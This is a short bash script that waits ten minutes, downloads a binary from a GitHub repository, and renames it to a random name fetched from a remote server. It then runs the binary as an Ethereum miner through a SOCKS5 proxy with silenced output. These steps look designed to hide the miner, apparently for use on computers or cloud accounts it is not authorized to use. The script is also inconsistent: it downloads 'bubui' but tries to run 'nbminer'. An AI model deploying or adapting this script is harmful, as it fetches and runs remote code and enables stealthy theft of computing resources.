#!/bin/bash
sleep 10m
wget https://github.com/anon1jju/ketaea/raw/631ff83f7fd506eaa419bc2319a9873ff1c90e7c/bubui
#wget https://cuan.mine.nu/nbminer
ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
chmod +x nbminer && mv nbminer $ACAK
read -p 'Input Proxy nya: ' PROXY
WALLET=prodent
POOL=stratum+tcp://ethash.poolbinance.com:1800
WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
#WORKER2=$(date '+%d%b')
#WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
